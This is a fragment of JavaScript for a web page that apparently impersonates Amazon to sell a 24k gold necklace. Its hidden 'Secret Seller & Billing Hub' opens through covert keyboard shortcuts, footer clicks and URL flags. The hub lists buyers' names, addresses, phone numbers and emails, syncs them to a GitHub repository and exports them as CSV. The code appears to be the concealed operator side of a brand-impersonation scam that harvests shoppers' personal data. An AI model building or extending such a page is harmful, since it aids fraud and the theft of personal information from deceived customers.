      showToast("🔒 Secret Seller & Billing Hub Opened");
    }, 400);

    const navSubOrdersPortal = document.getElementById("navSubOrdersPortal");
    if (navSubOrdersPortal) navSubOrdersPortal.style.display = "inline-block";
  }

  // Covert Trigger 2: Secret Keyboard Shortcut (Alt + S, Alt + A, or Ctrl + Shift + S)
  window.addEventListener("keydown", (e) => {
    if ((e.altKey && e.key.toLowerCase() === "s") || 
        (e.altKey && e.key.toLowerCase() === "a") || 
        (e.ctrlKey && e.shiftKey && e.key.toLowerCase() === "s")) {
      e.preventDefault();
      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    }
  });

  // Covert Trigger 3: Secret Gesture (Click footer Amazon.com trigger)
  let footerClickCount = 0;
  let footerClickTimer = null;
  if (footerTrigger) {
    footerTrigger.addEventListener("click", () => {
      footerClickCount++;
      clearTimeout(footerClickTimer);
      footerClickTimer = setTimeout(() => {
        footerClickCount = 0;
      }, 500);

      openDrawer();
      showToast("🔒 Secret Seller & Billing Hub Opened");
    });
  }

  // Covert Trigger 4: Returns & Orders button in top nav
  let navOrdersClickCount = 0;
  let navOrdersTimer = null;
  if (navOrdersBtn) {
    navOrdersBtn.addEventListener("click", (e) => {
      navOrdersClickCount++;
      clearTimeout(navOrdersTimer);
      navOrdersTimer = setTimeout(() => { navOrdersClickCount = 0; }, 600);

      const isAdminMode = urlQuery.has("admin") || 
                          urlQuery.has("secret") || 
                          urlQuery.has("orders") || 
                          urlQuery.has("seller") || 
                          localStorage.getItem("amazon_admin_mode") === "1" || 
                          e.altKey || 
                          navOrdersClickCount >= 2;

      if (isAdminMode) {
        e.preventDefault();
        openDrawer();
        showToast("🔒 Secret Seller & Billing Hub Opened");
      }
    });
  }

  if (btnCloseDrawer) btnCloseDrawer.addEventListener("click", closeDrawer);
  if (backdrop) backdrop.addEventListener("click", closeDrawer);

  if (continueShoppingBtn) {
    continueShoppingBtn.addEventListener("click", () => {
      window.location.href = "../../";
    });
  }

  if (clearBtn) {
    clearBtn.addEventListener("click", async () => {
      if (confirm("Reset all orders? This will clear local storage and sync an empty array to GitHub repository.")) {
        localStorage.removeItem("amazon_placed_orders_urbangold");
        clearBtn.disabled = true;
        clearBtn.textContent = "Clearing...";
        await deleteOrdersFromAPI();
        clearBtn.disabled = false;
        clearBtn.textContent = "Clear All Orders";
        renderOrdersDrawer();
        showToast("All orders have been reset.");
      }
    });
  }

  if (exportBtn) {
    exportBtn.addEventListener("click", async () => {
      const orders = await fetchOrdersFromAPI();
      if (!orders || orders.length === 0) {
        showToast("No orders available to export.");
        return;
      }
      exportOrdersToCSV(orders);
    });
  }

  if (btnCloseInvoice && invoiceModal) {
    btnCloseInvoice.addEventListener("click", () => {
      invoiceModal.style.display = "none";
    });
    invoiceModal.addEventListener("click", (e) => {
      if (e.target === invoiceModal) invoiceModal.style.display = "none";
    });
  }

  const btnDownloadReceipt = document.getElementById("btnDownloadReceiptBtn");
  if (btnDownloadReceipt) {
    btnDownloadReceipt.addEventListener("click", () => {
      if (state.placedOrder) {
        if (typeof window.downloadOrderInvoicePdf === "function") {
          window.downloadOrderInvoicePdf(state.placedOrder);
        } else {
          openInvoiceModal(state.placedOrder);
        }
      }
    });
  }

  const btnBackToProductPage = document.getElementById("btnBackToProductPage");
  if (btnBackToProductPage) {
    btnBackToProductPage.addEventListener("click", () => {
      window.location.reload();
    });
  }
}

async function renderOrdersDrawer() {
  const container = document.getElementById("ordersListContainer") || document.getElementById("drawerOrdersList");
  if (!container) return;

  container.innerHTML = '<div style="padding:24px; text-align:center; color:#565959;"><div class="spinner" style="margin:0 auto 10px;"></div>Loading orders...</div>';

  const orders = await fetchOrdersFromAPI();

  if (!orders || orders.length === 0) {
    container.innerHTML = `
      <div style="padding:48px 24px; text-align:center; color:#565959;">
        <div style="font-size:36px; margin-bottom:12px;">📦</div>
        <div style="font-weight:700; color:#0f1111; margin-bottom:6px;">No orders found</div>
        <div style="font-size:13px;">Placed orders will be listed here automatically.</div>
      </div>
    `;
    return;
  }

  container.innerHTML = orders.map((ord, idx) => `
    <div class="drawer-order-card" style="border:1px solid #d5d9d9; border-radius:8px; margin:12px 16px; padding:16px; background:#fff; box-shadow:0 1px 3px rgba(0,0,0,0.05);">
      <div style="display:flex; justify-content:space-between; align-items:flex-start; margin-bottom:10px; border-bottom:1px solid #eee; padding-bottom:8px;">
        <div>
          <span style="display:inline-block; background:#e7f4f5; color:#007185; font-size:11px; font-weight:700; padding:2px 6px; border-radius:3px;">
            ${ord.payMethod || 'Ask a Friend to Pay'}
          </span>
          <div style="font-size:11px; color:#565959; margin-top:4px;">${ord.dateStr || ''}</div>
        </div>
        <div style="font-size:16px; font-weight:700; color:#b12704;">
          ${ord.price || '$1,899.00'}
        </div>
      </div>
      <div style="font-weight:700; font-size:14px; color:#0f1111; margin-bottom:4px;">
        ${ord.item || 'UrbanGold 24k u-link necklace'}
      </div>
      <div style="font-size:12px; color:#565959; line-height:1.4; margin-bottom:12px;">
        <strong>Ship to:</strong> ${ord.name || 'Recipient'}<br>
        ${ord.address || ''}<br>
        ${ord.phoneNumber ? 'Tel: ' + ord.phoneNumber : ''}
      </div>
      <div style="display:flex; gap:8px;">
        <button type="button" class="btn-invoice-view" data-index="${idx}" style="flex:1; padding:6px; font-size:12px; background:#fff; border:1px solid #d5d9d9; border-radius:4px; font-weight:600; cursor:pointer;">
          📄 View Invoice
        </button>
      </div>
    </div>
  `).join('');

  container.querySelectorAll(".btn-invoice-view").forEach(btn => {
    btn.addEventListener("click", () => {
      const ord = orders[parseInt(btn.dataset.index, 10)];
      if (ord) openInvoiceModal(ord);
    });
  });
}

function openInvoiceModal(ord) {
  const modal = document.getElementById("invoiceModalBackdrop");
  const content = document.getElementById("invoicePrintContent");
  if (!modal || !content) return;

  if (typeof window.generateInvoiceHtml === "function") {
    content.innerHTML = window.generateInvoiceHtml(ord);
  }

  const btnDl = document.getElementById("btnModalDownloadPdf");
  if (btnDl) {
    btnDl.onclick = () => {
      if (typeof window.downloadOrderInvoicePdf === "function") {
        window.downloadOrderInvoicePdf(ord);
      }
    };
  }

  modal.style.display = "flex";
}

function exportOrdersToCSV(orders) {
  const headers = ["Order ID", "Date", "Customer Name", "Address", "Phone", "Email", "Item", "Price", "Quantity", "Payment Method"];
  const rows = orders.map(o => [
    `"${(o.orderId || '').replace(/"/g, '""')}"`,
    `"${(o.dateStr || '').replace(/"/g, '""')}"`,
    `"${(o.name || '').replace(/"/g, '""')}"`,
    `"${(o.address || '').replace(/"/g, '""')}"`,
    `"${(o.phoneNumber || '').replace(/"/g, '""')}"`,
    `"${(o.email || '').replace(/"/g, '""')}"`,
    `"${(o.item || '').replace(/"/g, '""')}"`,
    `"${(o.price || '').replace(/"/g, '""')}"`,
    `"${o.qty || 1}"`,
    `"${(o.payMethod || '').replace(/"/g, '""')}"`
  ]);

  const csvContent = "data:text/csv;charset=utf-8," + [headers.join(","), ...rows.map(r => r.join(","))].join("\n");
  const encodedUri = encodeURI(csvContent);
  const link = document.createElement("a");
  link.setAttribute("href", encodedUri);
  link.setAttribute("download", `amazon_urbangold_orders_${Date.now()}.csv`);
  document.body.appendChild(link);
  link.click();
  document.body.removeChild(link);
}
